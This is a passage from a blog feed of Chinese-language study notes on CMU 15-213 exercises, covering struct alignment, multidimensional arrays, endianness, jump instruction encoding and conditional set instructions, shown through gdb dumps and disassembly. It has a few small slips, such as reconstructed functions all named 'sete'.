类型，4 个字节，因此结构体的长度必须是 4 个字节的倍数，因此是 8 个字节，需要在 <code>char</code>  后再加 3 个字节的 <code>padding</code> 。 <code>pairs</code>  是一个包含两个结构体变量的数组，1 个变量是 8 个字节，2 个就是 16 个字节。</p>\n<p>我们验证一下 (此处 <code>pairs</code>  也可以替换成 <code>&amp;pairs</code> )：</p>\n<pre><code>(gdb) x/16bx pairs\n0x601080 &lt;pairs&gt;:       0xab    0xab    0xab    0xab    0x01    0x00    0x00    0x00\n0x601088 &lt;pairs+8&gt;:     0xcd    0xcd    0xcd    0xcd    0x02    0x00    0x00    0x00\n</code></pre>\n<p>此外，结构体中可以包含数组，此时 <code>结构体的alignment = max(数组中最大元素，结构体其他元素)</code> 。例如：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">triple</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">short</span> large <span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">char</span> small<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>其中 <code>short</code>  类型 2 个字节， <code>char</code>  类型 1 个字节。该结构体的长度 = 2 字节的整数倍。</p>\n<h2 id=\"2-d-arrays\"><a class=\"markdownIt-Anchor\" href=\"#2-d-arrays\">#</a> 2-D Arrays</h2>\n<p>一个嵌套的数组如下：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">int8_t</span> nested <span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token operator\">--</span>swig￼<span class=\"token number\">0</span><span class=\"token operator\">--</span><span class=\"token operator\">></span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>输入如下命令查看内存 <code>nested</code>  处的值：</p>\n<pre><code>(gdb) x/6bx nested\n0x601076 &lt;nested&gt;:      0x00    0x01    0x02    0x10    0x11    0x12\n</code></pre>\n<p>可以看到一个单元是 1 个字节，一共 6 个单元。数组元素按照行顺序排列。</p>\n<p>函数 <code>access</code>  的 C 版本如下：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">int8_t</span> <span class=\"token function\">access</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">int8_t</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span> arr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">size_t</span> row<span class=\"token punctuation\">,</span> <span class=\"token class-name\">size_t</span> column<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">return</span> arr<span class=\"token punctuation\">[</span>row<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>column<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>仔细查了一下<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8zMzU2OTM5MzM=\">资料</span>，在 C 语言中这里有两种写法要注意一下区分：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>arr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 定义一个指针 arr，指向一个包含 10 个元素的数组，arr 可以是 new int [n][3], 它可以是个二维数组</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">int</span><span class=\"token operator\">*</span> arr<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 定义一个包含 10 个元素的数组，其中每个元素都是一个 int 类型的指针，其起始地址为 arr</span></pre></td></tr></table></figure><p>这样声明的原因是： <code>[]</code>  运算符的优先级比 <code>*</code>  高，因此需要通过 <code>()</code>  来把 <code>*arr</code>  括起来。</p>\n<p>由此， <code>access</code>  函数的传入参数 <code>arr</code>  是一个指针，该指针指向一个 3 个元素的数组。可以有 <code>n</code>  个这样的指针，构成一个二维数组。如 <code>arr = new int[n][3]</code> ，那么 <code>arr</code>  有 n 行，每行都是一个指向三个元素的数组。这种表示不能用于第二维度（列）不等于 3 的数组，如 <code>int flipped [3][2]</code> 。</p>\n<p>如果要将 C 语言版本的 <code>access</code>  转化为汇编指令， <code>&amp;arr[row][col] = arr + row * 3 + col</code> （因为这里每个 <code>int</code>  都是一个字节，因此不需要乘上多余的 <code>sizeof(T)</code> ，否则就需要乘上 <code>sizeof(T)</code> 。可以使用一个寄存器作为 <code>arr</code> ，计算 <code>3 * row</code> ，再加上 <code>col</code> ，最后对指针解引，放到返回值中。</p>\n<p>对函数 <code>access</code>  进行反汇编，得到如下指令：</p>\n<pre><code>(gdb) disassemble access\nDump of assembler code for function access:\n   0x00000000004005b5 &lt;+0&gt;:     lea    (%rsi,%rsi,2),%rax ;; rax = 3 * rsi\n   0x00000000004005b9 &lt;+4&gt;:     add    %rax,%rdi ;; rdi += 3 * rsi\n   0x00000000004005bc &lt;+7&gt;:     movzbl (%rdi,%rdx,1),%eax ;; eax = *(rdi + 3 * rsi + rdx)\n   0x00000000004005c0 &lt;+11&gt;:    retq\nEnd of assembler dump.\n</code></pre>\n<p>这里我想 <code>%rdi</code>  是 <code>arr</code>  的基地址， <code>%rsi</code>  是 <code>row</code> ， <code>rdx</code>  是 <code>col</code> 。我们首先计算了 <code>3 * rsi</code> ，将其加到 <code>%rdi</code>  中，然后计算 <code>3 * %rsi + %rdx</code> 。</p>\n<p>现在给 3 个数组：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">int8_t</span> first <span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0x00</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token class-name\">int8_t</span> second <span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0x10</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x11</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x12</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token class-name\">int8_t</span> <span class=\"token operator\">*</span> multilevel <span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>first <span class=\"token punctuation\">,</span> second <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>这里 <code>multilevel</code>  是一个嵌套的数组，其第一个元素 <code>first</code>  是一个 3 个字节的数组，其本身是个指针。第二个元素 <code>second</code>  同理。<br>\n <code>multilevel</code>  的每个元素是 8 个字节。数组的每个元素是 1 个字节。输入如下指令检验：</p>\n<pre><code>(gdb) x/2gx multilevel\n0x601060 &lt;multilevel&gt;:  0x0000000000601073      0x0000000000601070\n(gdb) x/3bx first\n0x601073 &lt;first&gt;:       0x00    0x01    0x02\n(gdb) x/3bx multilevel[0]\n0x601073 &lt;first&gt;:       0x00    0x01    0x02\n(gdb) p &amp;first\n$4 = (int8_t (*)[3]) 0x601073 &lt;first&gt;\n(gdb) p &amp;second\n$5 = (int8_t (*)[3]) 0x601070 &lt;second&gt;\n</code></pre>\n<p>将上述 C 语言程序换成如下程序：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">int8_t</span> <span class=\"token function\">accessMultilevel</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">int8_t</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>arr <span class=\"token punctuation\">,</span> <span class=\"token class-name\">size_t</span> row <span class=\"token punctuation\">,</span> <span class=\"token class-name\">size_t</span> column<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">return</span> arr<span class=\"token punctuation\">[</span>row<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>column<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>这里将 <code>int8_t (*arr)[3]</code>  换成了 <code>int8_t **arr</code> ，也就是说这个 <code>arr</code>  可以指向一个二维数组，而这个二维数组的长和宽可以不定。<br>\n这里的计算公式就是 <code>a[row][col] = *(*(arr + row * 8) + column)</code> (因为 <code>int8_t</code>  是 1 个字节，所以无需乘上 <code>sizeof(T)</code> )。此处 <code>arr</code>  应该是基地址， <code>row</code>  存储在一个寄存器中， <code>column</code>  存储在一个寄存器中。</p>\n<p>对该函数进行反汇编，结果如下：</p>\n<pre><code>(gdb) disassemble accessMultilevel\nDump of assembler code for function accessMultilevel:\n   0x00000000004005c1 &lt;+0&gt;:     add    (%rdi,%rsi,8),%rdx ;; %rdx += *(%rdi + 8 * %rsi)\n   0x00000000004005c5 &lt;+4&gt;:     movzbl (%rdx),%eax ;; %eax = *(%rdx)\n   0x00000000004005c8 &lt;+7&gt;:     retq\nEnd of assembler dump.\n</code></pre>\n<p>这里 <code>%rdx</code>  中存储的是 <code>column</code> ， <code>%rdi</code>  中存储的是 <code>arr</code>  的基地址， <code>%rsi</code>  中存储的是 <code>row</code> 。如果 <code>first</code>  和 <code>second</code>  都含有 4 个元素的话，地址的计算不影响。但是如果俩数组长度不一样，那么索引的时候可能会出现地址越界的问题。</p>\n<p>如果数组这样定义：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">int8_t</span> <span class=\"token operator\">*</span> multilevel <span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>first<span class=\"token punctuation\">,</span> first<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>那么如果修改一个 <code>first</code>  的元素值的话，两个索引指向同一个数组，两索引对应数组那个值都会改变。</p>\n<h2 id=\"endianness-optional\"><a class=\"markdownIt-Anchor\" href=\"#endianness-optional\">#</a> Endianness (Optional)</h2>\n<p>还是之前那个 <code>courses</code>  结构体，我们先按照 4 个字节一组的单位打印它的值看看，再按照 1 个字节一组为单位打印前 4 个字节看看：</p>\n<pre><code>(gdb) x/4wx courses\n0x601110 &lt;courses&gt;:     0x00015213      0x00015513      0x00018213      0x00018600\n(gdb) x/4bx courses\n0x601110 &lt;courses&gt;:     0x13    0x52    0x01    0x00\n</code></pre>\n<p>我们可以看到一个数 ( <code>int</code>  类型，4 个字节)，按照 4 个字节一组打印的时候，显示的是 <code>0x15213</code> ，但是按照单个字节打印的时候发现低地址字节存放在低地址处，高地址字节存放在高地址处，因此该机器为小端序机器。小端序机器的缺陷在于不方便单字节读取，字节的顺序是倒过来的。</p>\n<p>但是小端序机器也有优点， <code>narrowingCast</code>  函数的 C 语言版本如下：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">narrowingCast</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span> <span class=\"token operator\">*</span>num<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span>num<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>我们对 <code>narrowingCast</code>  函数进行反汇编，得到如下结果：</p>\n<pre><code>(gdb) disassemble narrowingCast\nDump of assembler code for function narrowingCast:\n   0x00000000004005c9 &lt;+0&gt;:     mov    (%rdi),%eax\n   0x00000000004005cb &lt;+2&gt;:     retq\nEnd of assembler dump.\n</code></pre>\n<p>这个函数的功能是，将一个 <code>long*</code>  类型的指针解引，然后把它指向的地址的 4 个字节赋给 <code>%eax</code> 。<br>\n这里的一个问题是，对于一个数字： <code>0x0000000012345678</code> 。如果是小端法，低位字节存储在 <code>%rsp</code>  处，一直到 <code>%rsp + 3</code> 。而如果是大端法，低位字节存储在 <code>%rsp + 7</code> ，高位字节存储在 <code>%rsp + 4</code> 。因此如果是大端法，就没法用 <code>mov (%rdi),%eax</code>  来获取值，而应该用 <code>mov 4(%rdi),%eax</code>  来获取值</p>\n",
            "tags": []
        },
        {
            "id": "https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Activity/Machine%20control%20activity/",
            "url": "https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Activity/Machine%20control%20activity/",
            "title": "15-213 Machine Control Activity 记录",
            "date_published": "2024-02-29T09:14:07.000Z",
            "content_html": "<h2 id=\"basic-control-flow\"><a class=\"markdownIt-Anchor\" href=\"#basic-control-flow\">#</a> Basic Control Flow</h2>\n<p>首先回答 Q1：为什么 JZ 和 JE 指令相同？<br>\n对于 JZ，即 jump if zero，在跳转之前，我们首先需要将其与 0 做差，判断结果的 ZF 是否等于 1。对于 JE，我们首先将两数做差（也可以使用 <code>testq</code>  指令？），然后判断 ZF 是否等于 1。JZ 和 JE 都是对 ZF 进行判断，然后进行跳转。</p>\n<p>然后我们回答 Q2：首先阅读 <code>jumps.S</code> 。我们发现 <code>jumps.S</code>  就是以 <code>jump_insns</code>  开头的一群跳转指令的集合。然后我们输入如下指令：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ as jumps.S <span class=\"token parameter variable\">-o</span> jumps.o</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>$ objdump <span class=\"token parameter variable\">-d</span> jumps.o</pre></td></tr></table></figure><p>其结果如下：</p>\n<pre><code class=\"language-asm\">\njumps.o:     file format elf64-x86-64\n\n\nDisassembly of section .text:\n\n0000000000000000 &lt;jump_insns&gt;:\n   0:   eb 34                   jmp    36 &lt;destination&gt;\n   2:   70 32                   jo     36 &lt;destination&gt;\n   4:   71 30                   jno    36 &lt;destination&gt;\n   6:   72 2e                   jb     36 &lt;destination&gt;\n   8:   72 2c                   jb     36 &lt;destination&gt;\n   a:   72 2a                   jb     36 &lt;destination&gt;\n   c:   73 28                   jae    36 &lt;destination&gt;\n   e:   73 26                   jae    36 &lt;destination&gt;\n  10:   73 24                   jae    36 &lt;destination&gt;\n  12:   74 22                   je     36 &lt;destination&gt;\n  14:   74 20                   je     36 &lt;destination&gt;\n  16:   75 1e                   jne    36 &lt;destination&gt;\n  18:   75 1c                   jne    36 &lt;destination&gt;\n  1a:   76 1a                   jbe    36 &lt;destination&gt;\n  1c:   76 18                   jbe    36 &lt;destination&gt;\n  1e:   77 16                   ja     36 &lt;destination&gt;\n  20:   77 14                   ja     36 &lt;destination&gt;\n  22:   78 12                   js     36 &lt;destination&gt;\n  24:   79 10                   jns    36 &lt;destination&gt;\n  26:   7c 0e                   jl     36 &lt;destination&gt;\n  28:   7c 0c                   jl     36 &lt;destination&gt;\n  2a:   7d 0a                   jge    36 &lt;destination&gt;\n  2c:   7d 08                   jge    36 &lt;destination&gt;\n  2e:   7e 06                   jle    36 &lt;destination&gt;\n  30:   7e 04                   jle    36 &lt;destination&gt;\n  32:   7f 02                   jg     36 &lt;destination&gt;\n  34:   7f 00                   jg     36 &lt;destination&gt;\n\n0000000000000036 &lt;destination&gt;:\n  36:   c3                      retq\n</code></pre>\n<p>这些指令的共同点就是都跳转到地址为 36 的 <code>destination</code>  处。此外，每个跳转指令的编码都是 2 个字节，第二个字节的值即为跳转的相对偏移地址，其值 = 目的地址 - 下一套指令的地址（因为执行到这里的时候 PC 已经指向下一条了），所以需要将该值增加到 PC 中，然后进行跳转。</p>\n<p>接下来我们将 <code>.skip 97</code>  一行注释掉，然后再编译并且反汇编看看：</p>\n<pre><code>\njumps.o:     file format elf64-x86-64\n\n\nDisassembly of section .text:\n\n0000000000000000 &lt;jump_insns&gt;:\n   0:   e9 bd 00 00 00          jmpq   c2 &lt;destination&gt;\n   5:   0f 80 b7 00 00 00       jo     c2 &lt;destination&gt;\n   b:   0f 81 b1 00 00 00       jno    c2 &lt;destination&gt;\n  11:   0f 82 ab 00 00 00       jb     c2 &lt;destination&gt;\n  17:   0f 82 a5 00 00 00       jb     c2 &lt;destination&gt;\n  1d:   0f 82 9f 00 00 00       jb     c2 &lt;destination&gt;\n  23:   0f 83 99 00 00 00       jae    c2 &lt;destination&gt;\n  29:   0f 83 93 00 00 00       jae    c2 &lt;destination&gt;\n  2f:   0f 83 8d 00 00 00       jae    c2 &lt;destination&gt;\n  35:   0f 84 87 00 00 00       je     c2 &lt;destination&gt;\n  3b:   0f 84 81 00 00 00       je     c2 &lt;destination&gt;\n  41:   75 7f                   jne    c2 &lt;destination&gt;\n  43:   75 7d                   jne    c2 &lt;destination&gt;\n  45:   76 7b                   jbe    c2 &lt;destination&gt;\n  47:   76 79                   jbe    c2 &lt;destination&gt;\n  49:   77 77                   ja     c2 &lt;destination&gt;\n  4b:   77 75                   ja     c2 &lt;destination&gt;\n  4d:   78 73                   js     c2 &lt;destination&gt;\n  4f:   79 71                   jns    c2 &lt;destination&gt;\n  51:   7c 6f                   jl     c2 &lt;destination&gt;\n  53:   7c 6d                   jl     c2 &lt;destination&gt;\n  55:   7d 6b                   jge    c2 &lt;destination&gt;\n  57:   7d 69                   jge    c2 &lt;destination&gt;\n  59:   7e 67                   jle    c2 &lt;destination&gt;\n  5b:   7e 65                   jle    c2 &lt;destination&gt;\n  5d:   7f 63                   jg     c2 &lt;destination&gt;\n  5f:   7f 61                   jg     c2 &lt;destination&gt;\n        ...\n\n00000000000000c2 &lt;destination&gt;:\n  c2:   c3                      retq\n</code></pre>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLm9yYWNsZS5jb20vY2QvRTI2NTAyXzAxL2h0bWwvRTI4Mzg4L2VvaXlnLmh0bWw=\">Oracle 的 x86 Assembly Language Reference Manual </span>中写道：</p>\n<blockquote>\n<p>.skip integer, value</p>\n<p>While generating values for any data section, the .skip directive causes integer bytes to be skipped over, or, optionally, filled with the specified value.</p>\n</blockquote>\n<p>将 97 改为 98，再次处理后查看：</p>\n<pre><code>\njumps.o:     file format elf64-x86-64\n\n\nDisassembly of section .text:\n\n0000000000000000 &lt;jump_insns&gt;:\n   0:   e9 c2 00 00 00          jmpq   c7 &lt;destination&gt;\n   5:   0f 80 bc 00 00 00       jo     c7 &lt;destination&gt;\n   b:   0f 81 b6 00 00 00       jno    c7 &lt;destination&gt;\n  11:   0f 82 b0 00 00 00       jb     c7 &lt;destination&gt;\n  17:   0f 82 aa 00 00 00       jb     c7 &lt;destination&gt;\n  1d:   0f 82 a4 00 00 00       jb     c7 &lt;destination&gt;\n  23:   0f 83 9e 00 00 00       jae    c7 &lt;destination&gt;\n  29:   0f 83 98 00 00 00       jae    c7 &lt;destination&gt;\n  2f:   0f 83 92 00 00 00       jae    c7 &lt;destination&gt;\n  35:   0f 84 8c 00 00 00       je     c7 &lt;destination&gt;\n  3b:   0f 84 86 00 00 00       je     c7 &lt;destination&gt;\n  41:   0f 85 80 00 00 00       jne    c7 &lt;destination&gt;\n  47:   75 7e                   jne    c7 &lt;destination&gt;\n  49:   76 7c                   jbe    c7 &lt;destination&gt;\n  4b:   76 7a                   jbe    c7 &lt;destination&gt;\n  4d:   77 78                   ja     c7 &lt;destination&gt;\n  4f:   77 76                   ja     c7 &lt;destination&gt;\n  51:   78 74                   js     c7 &lt;destination&gt;\n  53:   79 72                   jns    c7 &lt;destination&gt;\n  55:   7c 70                   jl     c7 &lt;destination&gt;\n  57:   7c 6e                   jl     c7 &lt;destination&gt;\n  59:   7d 6c                   jge    c7 &lt;destination&gt;\n  5b:   7d 6a                   jge    c7 &lt;destination&gt;\n  5d:   7e 68                   jle    c7 &lt;destination&gt;\n  5f:   7e 66                   jle    c7 &lt;destination&gt;\n  61:   7f 64                   jg     c7 &lt;destination&gt;\n  63:   7f 62                   jg     c7 &lt;destination&gt;\n        ...\n\n00000000000000c7 &lt;destination&gt;:\n  c7:   c3                      retq\n</code></pre>\n<blockquote>\n<p>下一个问题是：为什么会这样？指令 <code>eb f0</code>  又是做什么的？This happens for each instruction that needs to<br>\nencode a change in % rip larger than 0x7F.（源自<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY3MuY211LmVkdS9hZnMvY3MvYWNhZGVtaWMvY2xhc3MvMTUyMTMtZjIzL3d3dy9hY3Rpdml0aWVzL21hY2hpbmUtY29udHJvbC1zb2xuLnBkZg==\"> Solution</span>)</p>\n</blockquote>\n<h2 id=\"comparisons-and-conditional-set-instructions\"><a class=\"markdownIt-Anchor\" href=\"#comparisons-and-conditional-set-instructions\">#</a> Comparisons and Conditional Set Instructions</h2>\n<p>运行 <code>gdb ./cmp-set</code> ，输入 <code>r</code> ，提示如下：</p>\n<pre><code>(gdb) r\nStarting program: /home/gwen/Documents/report/code/15213/Ch3 Machine Level Programming/machine-control/cmp-set\n\nThis program should be run inside GDB:\n  $ gdb /home/gwen/Documents/report/code/15213/Ch3 Machine Level Programming/machine-control/cmp-set\n  (gdb) r\nIf you didn't run it that way, it will now crash.\nOtherwise, you will get the (gdb) prompt back.\n\nType 'c' (short for 'continue') at the (gdb) prompt.\n\nProgram received signal SIGTRAP, Trace/breakpoint trap.\nmain (argc=&lt;optimized out&gt;, argv=&lt;optimized out&gt;) at machine-control/cmp-set.c:43\n43      machine-control/cmp-set.c: No such file or directory.\n</code></pre>\n<p>输入 <code>c</code> ，提示如下：</p>\n<pre><code>(gdb) c\nContinuing.\n\nBesides 'main', this program defines three functions:\n    'sete', 'seta', and 'setg'.\n\nUse the 'disassemble' command on each to see their code.\nThen, as instructed in the handout, use the 'call' command\nto call them with various arguments.\n\nWhen you have answered all the questions in this section of\nthe handout, use the 'c' command to go on.\n\nProgram received signal SIGTRAP, Trace/breakpoint trap.\nmain (argc=&lt;optimized out&gt;, argv=&lt;optimized out&gt;) at machine-control/cmp-set.c:45\n45      in machine-control/cmp-set.c\n</code></pre>\n<p>分别使用 <code>disassemble</code>  命令来查看 <code>sete</code> , <code>seta</code>  和 <code>setg</code>  三条指令，使用 <code>call</code>  命令来调用他们，完成任务后使用 <code>c</code>  来继续。</p>\n<p><code>sete</code>  反汇编结果如下：</p>\n<pre><code class=\"language-asm\">(gdb) disassemble sete\nDump of assembler code for function sete:\n   0x0000000000401178 &lt;+0&gt;:     cmp    %si,%di\n   0x000000000040117b &lt;+3&gt;:     sete   %al\n   0x000000000040117e &lt;+6&gt;:     movzbl %al,%eax\n   0x0000000000401181 &lt;+9&gt;:     retq\nEnd of assembler dump.\n</code></pre>\n<p>在 <code>sete</code>  中， <code>%si</code>  和 <code>%di</code>  包含参数， <code>%eax</code>  中包含返回值。该函数的 C 代码还原如下：</p>\n<blockquote>\n<p>这里到底是 <code>uint16_t</code>  还是 <code>int16_t</code> ? 有区别吗？</p>\n</blockquote>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdint.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">sete</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">uint16_t</span> si<span class=\"token punctuation\">,</span> <span class=\"token class-name\">uint16_t</span> di<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">return</span> si <span class=\"token operator\">==</span> di<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><code>seta</code>  函数的反汇编结果如下：</p>\n<pre><code>(gdb) disassemble seta\nDump of assembler code for function seta:\n   0x000000000040118c &lt;+0&gt;:     cmp    %si,%di\n   0x000000000040118f &lt;+3&gt;:     seta   %al\n   0x0000000000401192 &lt;+6&gt;:     movzbl %al,%eax\n   0x0000000000401195 &lt;+9&gt;:     retq\nEnd of assembler dump.\n</code></pre>\n<p><code>seta</code>  比较的是无符号数，其 C 语言代码如下：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdint.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">sete</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">uint16_t</span> si<span class=\"token punctuation\">,</span> <span class=\"token class-name\">uint16_t</span> di<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">return</span> di <span class=\"token operator\">></span> si<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><code>setg</code>  函数的反汇编结果如下：</p>\n<pre><code>(gdb) disassemble setg\nDump of assembler code for function setg:\n   0x0000000000401182 &lt;+0&gt;:     cmp    %si,%di\n   0x0000000000401185 &lt;+3&gt;:     setg   %al\n   0x0000000000401188 &lt;+6&gt;:     movzbl %al,%eax\n   0x000000000040118b &lt;+9&gt;:     retq\nEnd of assembler dump.\n</code></pre>\n<p><code>setg</code>  比较的是有符号数，其 C 语言代码如下：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdint.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">sete</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">int16_t</span> si<span class=\"token punctuation\">,</span> <span class=\"token class-name\">int16_t</span> di<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">return</span> di <span class=\"token operator\">></span> si<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>注意 <code>setg</code>  和 <code>seta</code>  有区别。<br>\n对不同组别的值分别调用 <code>sete</code> , <code>seta</code>  和 <code>setg</code> 